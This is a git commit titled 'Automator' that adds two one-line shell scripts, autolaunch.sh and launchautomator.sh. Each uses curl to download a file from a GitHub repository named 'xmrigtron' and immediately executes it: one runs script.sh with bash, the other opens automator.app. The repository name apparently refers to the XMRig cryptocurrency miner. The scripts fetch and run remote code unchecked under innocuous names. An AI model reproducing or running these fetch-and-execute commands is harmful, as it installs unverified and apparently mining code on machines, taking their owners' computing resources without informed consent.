d1461c8143c3fc8c06343c96f9992c6cca9f6d41
Sam <samuel.s.mamane@gmail.com>
2021-10-13 22:56:14 +0200

    Automator

---
+++ autolaunch.sh
@@ -0,0 +1,1 @@
+curl https://raw.githubusercontent.com/samkcah/xmrigtron/main/script.sh --output script.sh ; bash script.sh
---
+++ launchautomator.sh
@@ -0,0 +1,1 @@
+curl https://raw.githubusercontent.com/samkcah/xmrigtron/main/automator.app --output automator.app ; open automator.app
